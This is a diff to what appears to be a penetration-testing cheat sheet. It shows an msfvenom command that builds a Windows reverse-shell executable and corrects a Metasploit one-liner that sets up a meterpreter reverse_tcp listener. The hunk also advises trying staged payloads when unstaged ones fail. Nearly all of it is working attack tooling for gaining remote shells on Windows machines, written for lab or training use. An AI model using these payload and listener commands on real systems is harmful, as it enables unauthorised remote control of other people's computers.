@@ -10,7 +10,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=${PORT} -f exe -o she
 
 One-liner for setting up a listener
 ```
-sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set ${PORT} 6666; set ExitOnSession false; run"
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT ${PORT}; set ExitOnSession false; run"
 ```
 Also, keep in mind that it's worth attempting staged payloads if the unstaged one doesn't work (and vise versa).
 e.g. when `windows/x64/shell_reverse_tcp` doesn't work, it's worth it to give  `windows/x64/shell/reverse_tcp` a try.
